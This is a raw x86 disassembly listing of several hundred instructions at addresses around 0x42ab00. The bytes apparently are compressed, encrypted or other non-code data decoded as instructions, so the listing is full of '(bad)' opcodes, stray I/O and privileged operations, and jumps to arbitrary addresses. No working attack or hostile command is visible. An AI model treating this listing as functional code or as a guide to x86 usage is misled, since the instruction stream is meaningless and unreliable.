  42aaae:	adc    eax,0xab20a7f5
  42aab3:	mov    BYTE PTR [ecx+0x36252c96],dl
  42aab9:	icebp  
  42aaba:	or     al,0xff
  42aabc:	adc    edx,esp
  42aabe:	fld    QWORD PTR [edi]
  42aac0:	pop    ecx
  42aac1:	push   eax
  42aac2:	mov    eax,0x9f19ba37
  42aac7:	bound  ebp,QWORD PTR [eiz*4-0x4a7006f1]
  42aace:	mov    bl,0xf4
  42aad0:	es and al,0xa7
  42aad3:	jecxz  0x42aa91
  42aad5:	mov    bh,0x5c
  42aad7:	dec    edi
  42aad8:	lods   al,BYTE PTR ds:[esi]
  42aad9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42aada:	dec    ecx
  42aadb:	mov    dh,0x7
  42aadd:	int    0xfe
  42aadf:	mov    BYTE PTR [esi+0x15],dl
  42aae2:	scas   eax,DWORD PTR es:[edi]
  42aae3:	leave  
  42aae4:	xchg   edi,eax
  42aae5:	(bad)  
  42aae7:	test   DWORD PTR [ebx+esi*2-0x6cdef50d],esi
  42aaee:	xchg   esp,esi
  42aaf0:	push   0x2dd6bec5
  42aaf5:	or     eax,0x1a8add3f
  42aafa:	sbb    BYTE PTR [ebp+0x28],ch
  42aafd:	xlat   BYTE PTR ds:[ebx]
  42aafe:	add    DWORD PTR [ecx],ecx
  42ab00:	mov    ebp,0x624caedc
  42ab05:	jns    0x42aae6
  42ab07:	push   ebx
  42ab08:	loopne 0x42ab56
  42ab0a:	xor    BYTE PTR [ebx],dh
  42ab0c:	ss std 
  42ab0e:	shl    BYTE PTR [esi+0x377daa55],1
  42ab14:	sub    al,0xf6
  42ab16:	data16 cmp al,BYTE PTR [esi-0x7a]
  42ab1a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42ab1b:	dec    ebp
  42ab1c:	add    DWORD PTR [eax],ecx
  42ab1e:	and    al,0x49
  42ab20:	data16 (bad) 
  42ab22:	jle    0x42ab79
  42ab24:	jnp    0x42ab85
  42ab26:	pop    ebp
  42ab27:	popa   
  42ab28:	pop    ss
  42ab29:	and    cl,BYTE PTR [esi]
  42ab2b:	clc    
  42ab2c:	in     al,0xc1
  42ab2e:	aas    
  42ab2f:	mov    BYTE PTR ss:[ebx],cl
  42ab32:	arpl   WORD PTR [eax],dx
  42ab34:	xchg   DWORD PTR [ecx+0x6c],edi
  42ab37:	mov    dh,0xc
  42ab39:	xor    eax,0x6ff3b980
  42ab3e:	test   BYTE PTR [edx+0x5c31c91f],bh
  42ab44:	mov    edx,0x29cb1c66
  42ab49:	dec    edi
  42ab4a:	enter  0x53f5,0x7a
  42ab4e:	push   edx
  42ab4f:	mov    ds:0x35b3d505,eax
  42ab54:	push   0xffffffab
  42ab56:	test   BYTE PTR [ebp+0x3f],dl
  42ab59:	xchg   ebx,eax
  42ab5a:	mov    BYTE PTR [ebp+0x3fc4418d],al
  42ab60:	les    ebp,FWORD PTR [edi]
  42ab62:	pop    es
  42ab63:	sar    DWORD PTR [edx],cl
  42ab65:	sbb    al,0x67
  42ab67:	and    al,0xfd
  42ab69:	jmp    0x0:0x778a7387
	...
  42abd4:	add    BYTE PTR [eax],al
  42abd6:	ds push cs
  42abd8:	sub    al,0x5d
  42abda:	cmp    al,0x7f
  42abdc:	jg     0x42ac4d
  42abde:	and    BYTE PTR [eax],cl
  42abe0:	mov    dl,0x43
  42abe2:	pop    es
  42abe3:	stos   BYTE PTR es:[edi],al
  42abe4:	fwait
  42abe5:	xchg   esp,eax
  42abe6:	addr16 retf 0x1
  42abea:	add    BYTE PTR [ecx],al
  42abec:	add    BYTE PTR [eax],al
  42abee:	shr    bh,1
  42abf0:	pmulhw mm1,QWORD PTR [ebx]
  42abf3:	shr    ebp,0x49
  42abf6:	xchg   edi,eax
  42abf7:	mov    ds:0xb97746f3,eax
  42abfc:	mov    ss,edi
  42abfe:	pop    ds
  42abff:	addr16 xor al,0x8f
  42ac02:	jae    0x42aba7
  42ac04:	jbe    0x42ab91
  42ac06:	clc    
  42ac07:	mov    ebp,0x9f1fd917
  42ac0c:	or     BYTE PTR ds:0x238a4e95,al
  42ac12:	mov    ?,WORD PTR [eax-0x57]
  42ac15:	shl    BYTE PTR [ecx-0x77],cl
  42ac18:	(bad)  
  42ac1a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42ac1b:	mov    bl,0xe8
  42ac1d:	pop    edi
  42ac1e:	cli    
  42ac1f:	add    eax,0x4f34ccef
  42ac24:	or     DWORD PTR [edx-0x348ff00e],ecx
  42ac2a:	sbb    BYTE PTR [edi-0x35],bh
  42ac2d:	or     DWORD PTR [ebx],esi
  42ac2f:	enter  0x6c9,0x8a
  42ac33:	loopne 0x42abd6
  42ac35:	xchg   esp,eax
  42ac36:	bound  ebp,QWORD PTR [ecx+0x309031d1]
  42ac3c:	xchg   ebp,eax
  42ac3d:	mov    eax,0xaa9ea32d
  42ac42:	cmp    BYTE PTR [edi+0x10],0x2c
  42ac46:	mov    bl,0xc3
  42ac48:	sahf   
  42ac49:	inc    edi
  42ac4a:	cs scas eax,DWORD PTR es:[edi]
  42ac4c:	pop    es
  42ac4d:	push   eax
  42ac4e:	pop    es
  42ac4f:	dec    edx
  42ac50:	repnz pushfw 
  42ac53:	jnp    0x42ac55
  42ac55:	sub    bh,BYTE PTR [ecx+ebp*4+0x40]
  42ac59:	inc    ecx
  42ac5a:	sub    eax,0x56ede66b
  42ac5f:	cmp    bl,ah
  42ac61:	pop    esi
  42ac62:	push   edx
  42ac63:	daa    
  42ac64:	ret    0x28e2
  42ac67:	mov    al,ds:0x31958126
  42ac6c:	mov    ds:0x214be338,eax
  42ac71:	xor    DWORD PTR [eax-0x3bd74a21],ebp
  42ac77:	test   al,0x98
  42ac79:	xchg   edi,eax
  42ac7a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42ac7b:	cmp    cl,BYTE PTR [edi+0x61]
  42ac7e:	loope  0x42ace2
  42ac80:	push   ebp
  42ac81:	pop    ss
  42ac82:	adc    eax,0x57e27a16
  42ac87:	mov    ebp,edx
  42ac89:	inc    eax
  42ac8a:	jbe    0x42ac1e
  42ac8c:	shr    DWORD PTR [esi],0xb2
  42ac8f:	cli    
  42ac90:	test   BYTE PTR [ecx+0x775283cb],ch
  42ac96:	outs   dx,BYTE PTR ds:[esi]
  42ac97:	pop    ebp
  42ac98:	packuswb mm1,QWORD PTR [ebp-0x350355f0]
  42ac9f:	popa   
  42aca0:	xchg   esp,eax
  42aca1:	jecxz  0x42ac9b
  42aca3:	push   eax
  42aca4:	(bad)  
  42aca6:	lods   al,BYTE PTR ds:[esi]
  42aca7:	or     dh,BYTE PTR [esi]
  42aca9:	rol    ch,0x95
  42acac:	aam    0x3e
  42acae:	cli    
  42acaf:	cmp    BYTE PTR [edx+0x74b580c2],dh
  42acb5:	push   ecx
  42acb6:	cmp    eax,0x159c62ed
  42acbb:	jmp    0x91a5:0xa490313c
  42acc2:	jne    0x42ad3e
  42acc4:	xor    DWORD PTR ds:0x69870dd6,0xffffff82
  42accb:	xchg   ah,al
  42accd:	fsubr  QWORD PTR [eax-0x133e3c71]
  42acd3:	mov    ch,0xa7
  42acd5:	mov    esp,0x3fac97bb
  42acda:	inc    ecx
  42acdb:	dec    esi
  42acdc:	iret   
  42acdd:	scas   al,BYTE PTR es:[edi]
  42acde:	call   0xb455:0x7376503c
  42ace5:	xor    DWORD PTR [eax+0x57fa594],0x6e
  42acec:	fs add BYTE PTR es:[eax],al
	...
  42ad54:	add    BYTE PTR [eax],al
  42ad56:	jmp    0xdf7cc98d
  42ad5b:	ds out dx,eax
  42ad5d:	repz ret 
  42ad5f:	fcom   DWORD PTR [edx+0x72]
  42ad62:	cdq    
  42ad63:	shl    BYTE PTR [eax+ecx*4+0x67],1
  42ad67:	retf   
  42ad68:	add    DWORD PTR [eax],eax
  42ad6a:	add    BYTE PTR [ecx],al
  42ad6c:	add    BYTE PTR [eax],al
  42ad6e:	in     al,0xe
  42ad70:	out    0xae,eax
  42ad72:	jnp    0x42adb9
  42ad74:	bound  ebp,QWORD PTR [esi]
  42ad76:	xchg   edi,eax
  42ad77:	jne    0x42ad03
  42ad79:	out    0x35,al
  42ad7b:	shl    BYTE PTR [edx-0x4d3ea8c7],0x2
  42ad82:	out    0xd3,eax
  42ad84:	or     al,0xc6
  42ad86:	loope  0x42ae03
  42ad88:	outs   dx,BYTE PTR ds:[esi]
  42ad89:	xor    eax,0x7c454470
  42ad8e:	jno    0x42ad3a
  42ad90:	ss das 
  42ad92:	(bad)
  42ad95:	in     eax,0xa2
  42ad97:	(bad)  [edx]
  42ad99:	adc    BYTE PTR [esi-0x3ab08c1b],dl
  42ad9f:	sub    al,0x20
  42ada1:	(bad)  
  42ada2:	adc    dh,BYTE PTR [ebx-0x7d]
  42ada5:	pop    ds
  42ada6:	iret   
  42ada7:	sub    BYTE PTR [edx],bh
  42ada9:	cmp    BYTE PTR [edx+edi*2],ah
  42adac:	mov    ebp,DWORD PTR [esi]
  42adae:	dec    ecx
  42adaf:	jns    0x42ad8f
  42adb1:	arpl   WORD PTR [ecx-0x7b6bd71],di
  42adb7:	push   eax
  42adb8:	in     al,dx
  42adb9:	mov    eax,0x89b55efe
  42adbe:	adc    bh,BYTE PTR [ebx-0x59]
  42adc1:	add    ecx,DWORD PTR [eax+0x1d]
  42adc4:	xor    edx,edi
  42adc6:	test   eax,0x43ab9f05
  42adcb:	mov    ecx,eax
  42adcd:	cs std 
  42adcf:	dec    eax
  42add0:	mov    dl,BYTE PTR ds:0xfaed33b0
  42add6:	mov    ch,ah
  42add8:	inc    edi
  42add9:	js     0x42adcc
  42addb:	mov    bl,0xe
  42addd:	aaa    
  42adde:	pop    es
  42addf:	pop    ss
  42ade0:	adc    cl,BYTE PTR [ecx-0x674236aa]
  42ade6:	gs cdq 
  42ade8:	pop    ecx
  42ade9:	les    eax,FWORD PTR [ebx]
  42adeb:	dec    ebp
  42adec:	(bad)  
  42aded:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42adee:	out    0xf1,eax
  42adf0:	sbb    ebp,DWORD PTR [eax]
  42adf2:	adc    al,0xc
  42adf4:	mov    esi,0xa8822525
  42adf9:	outs   dx,DWORD PTR ds:[esi]
  42adfa:	mov    dh,0x59
  42adfc:	mov    al,ds:0x934b6964
  42ae01:	lahf   
  42ae02:	pop    es
  42ae03:	sub    al,0xf8
  42ae05:	or     eax,0x8453f754
  42ae0a:	sub    eax,0xb4dab0be
  42ae0f:	into   
  42ae10:	clc    
  42ae11:	pop    es
  42ae12:	imul   edi,edi,0xf32b0473
  42ae18:	jl     0x42ade5
  42ae1a:	pop    ds
  42ae1b:	inc    edi
  42ae1c:	ror    DWORD PTR [esi+0x5747bfc2],0x97
  42ae23:	sub    eax,0x889ff2cd
  42ae28:	cmp    eax,0x9906beab
  42ae2d:	pop    ss
  42ae2e:	shl    DWORD PTR [edi],0x55
  42ae31:	test   ecx,edx
  42ae33:	sbb    eax,0xd4938205
  42ae38:	into   
  42ae39:	lods   al,BYTE PTR ds:[esi]
  42ae3a:	imul   ecx,ebp,0xe4b42418
  42ae40:	call   0x88b7cd07
  42ae45:	aam    0x8b
  42ae47:	mov    ah,BYTE PTR [esi+0x12]
  42ae4a:	inc    edi
  42ae4c:	xchg   esp,eax
  42ae4d:	push   es
  42ae4e:	mov    BYTE PTR [eax],0x40
  42ae51:	adc    dh,BYTE PTR [ebp-0x60]
  42ae54:	inc    edi
  42ae55:	mov    fs,WORD PTR [ecx-0x18]
  42ae58:	ss push 0xffffffe7
  42ae5b:	pop    ds
  42ae5c:	dec    edi
  42ae5d:	sub    ebx,0xb98fc671
  42ae63:	mov    DWORD PTR [edx-0x18],edx
  42ae66:	sbb    BYTE PTR [edx-0xd],ah
  42ae69:	cmp    al,0x78
  42ae6b:	outs   dx,DWORD PTR ds:[esi]
  42ae6c:	add    DWORD PTR [eax+eax*1+0x0],esp
	...
  42aed4:	add    BYTE PTR [eax],al
  42aed6:	mov    edi,0x4a8e4af7
  42aedb:	mov    edi,0x7bd8f7ff
  42aee0:	mov    dh,0xb9
  42aee2:	push   eax
  42aee3:	ret    
  42aee4:	jl     0x42ae89
  42aee6:	addr16 int3 
  42aee8:	add    DWORD PTR [eax],eax
  42aeea:	add    BYTE PTR [ecx],al
  42aeec:	add    BYTE PTR [eax],al
  42aeee:	fisubr WORD PTR [esi]
  42aef0:	inc    eax
  42aef1:	mov    WORD PTR [ebx],ds
  42aef3:	fisub  DWORD PTR [ecx]
  42aef5:	or     DWORD PTR [esi+0x56a0b8d9],eax
  42aefb:	loop   0x42af40
  42aefd:	iret   
  42aefe:	mov    ebx,0xac44eeb8
  42af03:	pop    edx
  42af04:	jp     0x42ae8e
  42af06:	fwait
  42af07:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42af08:	inc    esi
  42af09:	leave  
  42af0a:	js     0x42af78
  42af0c:	adc    al,0x65
  42af0e:	jmp    0xa211:0x7dc3db23
  42af15:	or     esi,DWORD PTR ds:0x2166fea
  42af1b:	enter  0xdb99,0x37
  42af1f:	mov    cl,0xce
  42af21:	pushf  
  42af22:	je     0x42af34
  42af24:	xor    al,0x1f
  42af26:	mov    dh,0xbb
  42af28:	(bad)  
  42af29:	popa   
  42af2a:	sbb    DWORD PTR [ebx],eax
  42af2c:	cmp    BYTE PTR [eax-0x27],bl
  42af2f:	jmp    0x4512:0x630d8102
  42af36:	in     al,dx
  42af37:	mov    edx,esi
  42af39:	bound  ebx,QWORD PTR es:[edi-0x41]
  42af3d:	lock arpl WORD PTR [edi+ebx*8-0x66],si
  42af42:	mov    esi,0xfc986cab
  42af47:	lods   al,BYTE PTR ds:[esi]
  42af48:	fldcw  WORD PTR [ecx]
  42af4a:	outs   dx,DWORD PTR ds:[esi]
  42af4b:	ja     0x42afb7
  42af4d:	jbe    0x42aefd
  42af4f:	test   eax,0x104bd5fd
  42af54:	je     0x42aee0
  42af56:	fisubr DWORD PTR [edi-0x31]
  42af59:	outs   dx,DWORD PTR ss:[esi]
  42af5b:	inc    ebp
  42af5c:	mov    edi,0x4487634a
  42af61:	jns    0x42aee6
  42af63:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42af64:	fcomp  DWORD PTR [eax+0x70]
  42af67:	add    edx,DWORD PTR [edx-0x46]
  42af6a:	fbstp  TBYTE PTR [ecx-0x21]
  42af6d:	xchg   edi,eax
  42af6e:	mov    ecx,0x14c9b1b8
  42af73:	rol    DWORD PTR [edx],1
  42af75:	sub    al,0xb4
  42af77:	xor    BYTE PTR [esi+ebp*4+0x69c018f6],bl
  42af7e:	or     BYTE PTR [eax],0xae
  42af81:	rol    BYTE PTR ds:0x6cc40c3e,1
  42af87:	loopne 0x42afcb
  42af89:	inc    edx
  42af8a:	shr    BYTE PTR [esi+0x55c033e],cl
  42af90:	loop   0x42af42
  42af92:	adc    BYTE PTR [ebp-0x18],0x6
  42af96:	jle    0x42af4a
  42af98:	data16 and BYTE PTR [esi-0x290526a2],ch
  42af9f:	mov    bh,0x9a
  42afa1:	jmp    0x3cdd9192
  42afa6:	pushf  
  42afa7:	fidivr WORD PTR [ebp-0x25]
  42afaa:	sub    bl,BYTE PTR [ebx-0x79798b98]
  42afb0:	mov    edx,0x74d39f6
  42afb5:	xor    al,0x11
  42afb7:	pop    ebp
  42afb8:	loop   0x42afc9
  42afba:	repnz fnstsw WORD PTR ds:0xfeb0a699
  42afc1:	sub    DWORD PTR [ecx-0x64e5fe11],esi
  42afc7:	push   ds
  42afc8:	xchg   edi,eax
  42afc9:	mov    ds:0xffda252c,eax
  42afce:	jmp    0x729b:0x3fa9305f
  42afd5:	xor    ch,BYTE PTR [ecx+edi*4]
  42afd8:	push   edx
  42afd9:	xchg   bx,ax
  42afdb:	inc    edi
  42afdc:	add    al,0x44
  42afde:	fwait
  42afdf:	mov    ebx,0xc5c7fe60
  42afe4:	out    dx,eax
  42afe5:	fistp  QWORD PTR [ebp+0x4419e80a]
  42afeb:	xor    eax,DWORD PTR [edi]
  42afed:	pop    ds
	...
  42b056:	stc    
  42b057:	enter  0xdc7a,0x7b
  42b05b:	(bad)  
  42b05c:	(bad)  
  42b05d:	in     eax,dx
  42b05e:	sbb    al,0x4f
  42b060:	push   ebp
  42b061:	inc    esp
  42b062:	jg     0x42b06c
  42b064:	outs   dx,BYTE PTR ds:[esi]
  42b065:	jge    0x42b0ce
  42b067:	int    0x1
  42b069:	add    BYTE PTR [eax],al
  42b06b:	add    DWORD PTR [eax],eax
  42b06d:	add    bh,al
  42b06f:	and    eax,0x55d54345
  42b074:	cli    
  42b075:	outs   dx,BYTE PTR ds:[esi]
  42b076:	scas   eax,DWORD PTR es:[edi]
  42b077:	sbb    DWORD PTR [eax-0x59],esi
  42b07a:	xchg   ebx,eax
  42b07b:	ret    0xe3a5
  42b07e:	xor    DWORD PTR [eax+0x37],ecx
  42b081:	call   0x72b72d04
  42b086:	leave  
  42b087:	call   0xa7fcfb8a
  42b08c:	add    esi,DWORD PTR [eax-0x295e2727]
  42b092:	icebp  
  42b093:	loopne 0x42b04a
  42b095:	adc    ch,BYTE PTR [eax]
  42b097:	mov    al,ah
  42b099:	retf   0xd68
  42b09c:	mov    ecx,0xfb89b613
  42b0a1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42b0a2:	mov    ebp,0x17272cf8
  42b0a7:	daa    
  42b0a8:	ins    BYTE PTR es:[edi],dx
  42b0a9:	ror    BYTE PTR [ecx],1
  42b0ab:	inc    edi
  42b0ac:	shl    BYTE PTR [eax+eiz*4+0x42],0x92
  42b0b1:	jns    0x42b0c4
  42b0b3:	sahf   
  42b0b4:	mov    ebx,0x7ecb6e14
  42b0b9:	mov    ebx,0x5773e829
  42b0be:	mov    ebx,0x2e0d3cc2
  42b0c3:	inc    ebx
  42b0c4:	ins    DWORD PTR es:[edi],dx
  42b0c5:	mov    esp,0xd11738e2
  42b0ca:	sbb    ch,BYTE PTR [esi+esi*8]
  42b0cd:	mov    bh,0x90
  42b0cf:	jns    0x42b0d5
  42b0d1:	jb     0x42b0c5
  42b0d3:	mov    bh,0xf8
  42b0d5:	or     dl,BYTE PTR [eax]
  42b0d7:	jmp    0x984e8d2d
  42b0dc:	jns    0x42b08d
  42b0de:	int    0xd3
  42b0e0:	(bad)
  42b0e4:	clc    
  42b0e5:	xchg   edx,eax
  42b0e6:	sub    eax,0xffffffbc
  42b0e9:	inc    eax
  42b0ea:	sti    
  42b0eb:	mov    esi,0xe1a9aaa2
  42b0f0:	call   0x981e7bc7
  42b0f5:	adc    BYTE PTR [eax+edi*2+0x22],ah
  42b0f9:	and    BYTE PTR [ebp-0x66],bh
  42b0fc:	adc    eax,0x491c8f6a
  42b101:	int    0x8a
  42b103:	jmp    0xa6ec7688
  42b108:	retf   0x11f4
  42b10b:	jno    0x42b181
  42b10d:	jmp    0xf5cf52ff
  42b112:	mov    DWORD PTR [ebp-0x5cf391b],esp
  42b118:	test   eax,0x7ccda466
  42b11d:	aaa    
  42b11e:	pop    ebp
  42b11f:	in     al,0xd6
  42b121:	inc    edi
  42b122:	jb     0x42b0eb
  42b124:	addr16 cdq 
  42b126:	ja     0x42b19a
  42b128:	push   0x6a
  42b12a:	push   ss
  42b12b:	cwde   
  42b12c:	gs leave 
  42b12e:	call   0xb08f:0x5b7fc887
  42b135:	jbe    0x42b0c8
  42b137:	nop
  42b138:	pushf  
  42b139:	inc    eax
  42b13a:	jg     0x42b120
  42b13c:	daa    
  42b13d:	(bad)  
  42b13e:	and    DWORD PTR [ecx+0xe],edi
  42b141:	push   edx
  42b142:	mov    ah,0xa6
  42b144:	(bad)  
  42b145:	pop    ecx
  42b146:	cmp    DWORD PTR [ebp+ecx*2+0x2a],eax
  42b14a:	inc    ecx
  42b14b:	test   DWORD PTR [ebx+0x247b185],esp
  42b151:	push   ecx
  42b152:	cwde   
  42b153:	or     al,bh
  42b155:	mov    edi,DWORD PTR [ebx+0x45aa322e]
  42b15b:	jns    0x42b123
  42b15d:	push   ebx
  42b15e:	sub    al,0x3c
  42b160:	pop    ss
  42b161:	out    0x7e,al
  42b163:	in     eax,dx
  42b164:	cdq    
  42b165:	sbb    al,BYTE PTR [edx]
  42b167:	mov    ebx,DWORD PTR [esp+eax*1+0x43]
  42b16b:	push   ebp
  42b16c:	sub    eax,0x17
	...
  42b1d5:	add    BYTE PTR [ebp+0x25],dh
  42b1d8:	imul   ebx,DWORD PTR [edi-0x51]
  42b1dc:	cmc    
  42b1dd:	call   eax
  42b1df:	inc    ebx
  42b1e0:	push   edi
  42b1e1:	popa   
  42b1e2:	cmp    DWORD PTR [eax-0x3198a996],eax
  42b1e8:	add    DWORD PTR [eax],eax
  42b1ea:	add    BYTE PTR [ecx],al
  42b1ec:	add    BYTE PTR [eax],al
  42b1ee:	test   al,0x7d
  42b1f0:	xor    ch,BYTE PTR [eax]
  42b1f2:	add    esi,DWORD PTR [edi+0x1240a285]
  42b1f8:	ja     0x42b17c
  42b1fa:	js     0x42b1b4
  42b1fc:	sbb    BYTE PTR ds:0x116be5f9,dh
  42b202:	ss pop ecx
  42b204:	dec    eax
  42b205:	mov    eax,ds:0xf912741
  42b20a:	xchg   ebp,eax
  42b20b:	xchg   DWORD PTR [eax-0x2fca583d],esp
  42b211:	ins    DWORD PTR es:[edi],dx
  42b212:	dec    esi
  42b213:	mov    ds:0x299a7bc1,eax
  42b218:	ja     0x42b27d
  42b21a:	in     eax,dx
  42b21b:	test   DWORD PTR [eax+ecx*1+0x31],edx
  42b21f:	fwait
  42b220:	cmp    eax,0xb9b7fc89
  42b225:	xchg   ebx,eax
  42b226:	mov    fs,WORD PTR [ecx]
  42b228:	int    0x1
  42b22a:	mov    gs,WORD PTR [edi]
  42b22c:	dec    edi
  42b22d:	mov    ch,0x67
  42b22f:	cmc    
  42b230:	daa    
  42b231:	shl    DWORD PTR [esi-0xa6f1634],cl
  42b237:	icebp  
  42b238:	jmp    0xeb99:0xcd737c79
  42b23f:	retf   0xca21
  42b242:	add    BYTE PTR [ebp-0x76],dh
  42b245:	aas    
  42b246:	mov    edi,ds
  42b248:	sub    al,0x22
  42b24a:	push   0x5e96f047
  42b24f:	es test eax,0x766e3c35
  42b255:	mov    ecx,0x7ba97259
  42b25a:	sbb    DWORD PTR [ebp+edi*1-0x74],eax
  42b25e:	adc    DWORD PTR ds:0x19b69696,esi
  42b264:	lods   al,BYTE PTR ds:[esi]
  42b265:	call   0xf82e3cc9
  42b26a:	shr    DWORD PTR [ecx+0x55a2d168],0xfe
  42b271:	add    BYTE PTR [ebx],0x6c
  42b274:	sub    eax,0x4c113947
  42b279:	dec    esi
  42b27a:	mov    edi,0x13acec48
  42b27f:	and    DWORD PTR [eax-0xc],edx
  42b282:	and    eax,0x69080b21
  42b287:	imul   DWORD PTR [ebx+esi*1-0x7c]
  42b28b:	loopne 0x42b215
  42b28d:	sti    
  42b28e:	(bad)  [ebx]
  42b290:	retf   0xc9d4
  42b293:	pusha  
  42b294:	and    cl,0x8
  42b297:	loope  0x42b267
  42b299:	enter  0xdf6f,0x18
  42b29d:	adc    DWORD PTR [eax],ebp
  42b29f:	mov    cl,0x4
  42b2a1:	mul    BYTE PTR [ebx-0x16]
  42b2a4:	aam    0x9c
  42b2a6:	fisttp QWORD PTR [edx-0x3911afd2]
  42b2ac:	push   edi
  42b2ad:	test   BYTE PTR [ebx],cl
  42b2af:	cwde   
  42b2b0:	xor    BYTE PTR [esi-0x6e],ah
  42b2b3:	fwait
  42b2b4:	mov    bl,BYTE PTR [eax-0x51]
  42b2b7:	call   0xfaeb5c18
  42b2bc:	mov    ds:0xc18af560,al
  42b2c1:	push   ds
  42b2c2:	fisubr WORD PTR [esi-0x56]
  42b2c5:	cwde   
  42b2c6:	push   es
  42b2c7:	pushf  
  42b2c8:	cmp    eax,0x76022c4a
  42b2cd:	sub    al,0x12
  42b2cf:	mov    eax,0x80c6d338
  42b2d4:	je     0x42b265
  42b2d6:	test   BYTE PTR [esi-0x14],0x35
  42b2da:	add    DWORD PTR [edi-0x23],eax
  42b2dd:	mov    ecx,0x139f2105
  42b2e2:	pop    edx
  42b2e3:	fdiv   DWORD PTR [ebp-0x194a6eb3]
  42b2e9:	xor    ch,BYTE PTR [esi+0xcde91c]
	...
  42b353:	add    BYTE PTR [eax],al
  42b355:	add    BYTE PTR [ebp-0x449f6672],ah
  42b35b:	ja     0x42b35a
  42b35d:	iret   
  42b35e:	sub    eax,0x8e738e65
  42b363:	mov    ecx,0xcf67376a
  42b368:	add    DWORD PTR [eax],eax
  42b36a:	add    BYTE PTR [ecx],al
  42b36c:	add    BYTE PTR [eax],al
  42b36e:	call   0xfcc2:0x6a81e7d8
  42b375:	or     eax,edx
  42b377:	mov    WORD PTR [edi-0x2f207534],?
  42b37d:	sahf   
  42b37e:	or     BYTE PTR [ecx+0x1709591d],al
  42b384:	pop    eax
  42b385:	bound  ebx,QWORD PTR [ecx+edx*8+0x16]
  42b389:	jno    0x42b3fc
  42b38b:	xlat   BYTE PTR ds:[ebx]
  42b38c:	adc    eax,0x1a6c9f09
  42b391:	inc    ecx
  42b392:	dec    eax
  42b393:	fstp   TBYTE PTR gs:[edx+0x11a781c6]
  42b39a:	add    DWORD PTR [esp+esi*2+0x28],edi
  42b39e:	mov    edx,0x42401ce6
  42b3a3:	sbb    esp,0x75
  42b3a6:	xor    ax,0x10c4
  42b3aa:	pop    ecx
  42b3ab:	push   edi
  42b3ac:	pop    eax
  42b3ad:	or     cl,bl
  42b3af:	jge    0x42b3b6
  42b3b1:	dec    ecx
  42b3b2:	mov    ch,BYTE PTR [esi+0x5fa274bc]
  42b3b8:	adc    DWORD PTR [eax],ebx
  42b3ba:	retf   0x55d8
  42b3bd:	pop    es
  42b3be:	push   esi
  42b3bf:	inc    edi
  42b3c0:	retf   0x1fdc
  42b3c3:	ror    DWORD PTR [ecx+ecx*8],0xdf
  42b3c7:	jo     0x42b3b4
  42b3c9:	mov    esp,DWORD PTR [esi+0x11]
  42b3cc:	int3   
  42b3cd:	push   0xe1a3d207
  42b3d2:	(bad)  
  42b3d3:	ss jp  0x42b419
  42b3d6:	in     al,dx
  42b3d7:	jne    0x42b3ef
  42b3d9:	in     al,0xe3
  42b3db:	mov    eax,ds:0xab0e3db3
  42b3e0:	xor    eax,0x3ecd43b7
  42b3e5:	call   0x6f6476c6
  42b3ea:	dec    ecx
  42b3eb:	push   edi
  42b3ec:	mov    ?,WORD PTR [ecx-0x6c]
  42b3ef:	jnp    0x42b3f5
  42b3f1:	ds cmc 
  42b3f3:	pop    ss
  42b3f4:	lods   al,BYTE PTR ds:[esi]
  42b3f5:	sub    eax,0xe19f1687
  42b3fa:	pop    es
  42b3fb:	(bad)  
  42b3fc:	loope  0x42b459
  42b3fe:	sahf   
  42b3ff:	or     eax,0x892950f3
  42b404:	pop    ecx
  42b405:	fucompp 
  42b407:	jmp    0x42b43b
  42b409:	cmc    
  42b40a:	cwde   
  42b40b:	dec    edx
  42b40c:	stos   BYTE PTR es:[edi],al
  42b40d:	pop    ss
  42b40e:	stos   DWORD PTR es:[edi],eax
  42b40f:	and    al,0xce
  42b411:	repz jmp 0xd4de1975
  42b417:	sub    eax,edi
  42b419:	ret    
  42b41a:	repnz mov ebp,DWORD PTR [ebp+0x23727cb9]
  42b421:	retf   0xf52
  42b424:	popa   
  42b425:	jnp    0x42b45b
  42b427:	cdq    
  42b428:	mov    ss,ebx
  42b42a:	je     0x42b405
  42b42c:	cmp    eax,0x90468684
  42b431:	into   
  42b432:	lock mov dh,0x7d
  42b435:	loop   0x42b3e0
  42b437:	fcomp  DWORD PTR [ebp-0x3039da27]
  42b43d:	fild   DWORD PTR [ecx]
  42b43f:	pushf  
  42b440:	aad    0xe8
  42b442:	dec    ebp
  42b443:	jge    0x42b42c
  42b445:	sbb    ah,BYTE PTR [ebx+0x6e194050]
  42b44b:	jmp    0x722d057e
  42b450:	sbb    eax,0xada619ac
  42b455:	rcl    esp,0x50
  42b458:	pop    es
  42b459:	dec    esp
  42b45a:	and    eax,0xf64b6f25
  42b45f:	stc    
  42b460:	aad    0xa7
  42b462:	sub    BYTE PTR [edx],0xf2
  42b465:	sbb    eax,0x9e6b5f8
  42b46a:	cmp    DWORD PTR ds:[eax],ecx
  42b46d:	sbb    DWORD PTR [eax],eax
	...
  42b4d3:	add    BYTE PTR [eax],al
  42b4d5:	add    BYTE PTR [edx-0x1011dfbb],cl
  42b4db:	out    dx,eax
  42b4dc:	into   
  42b4dd:	gs jo  0x42b4b0
  42b4e0:	cld    
  42b4e1:	test   DWORD PTR [edx+0x6773e594],esi
  42b4e7:	rol    BYTE PTR [ecx],1
  42b4e9:	add    BYTE PTR [eax],al
  42b4eb:	add    DWORD PTR [eax],eax
  42b4ed:	add    BYTE PTR [eax+0x536835d8],cl
  42b4f3:	push   esi
  42b4f4:	jg     0x42b48d
  42b4f6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b4f7:	cmp    DWORD PTR [ebp-0x4b],eax
  42b4fa:	into   
  42b4fb:	and    edi,DWORD PTR [eax+0x2441a44a]
  42b501:	(bad)  
  42b502:	jp     0x42b514
  42b504:	xchg   DWORD PTR fs:[edi],esp
  42b507:	loope  0x42b498
  42b509:	mov    DWORD PTR ds:0x9758dcd3,esp
  42b50f:	and    DWORD PTR [edi-0x230f69ab],edi
  42b515:	fbstp  TBYTE PTR [edx-0x74]
  42b518:	jecxz  0x42b523
  42b51a:	rcl    BYTE PTR [edi],0x3d
  42b51d:	sbb    bl,cl
  42b51f:	outs   dx,BYTE PTR ds:[esi]
  42b520:	sti    
  42b521:	dec    ebp
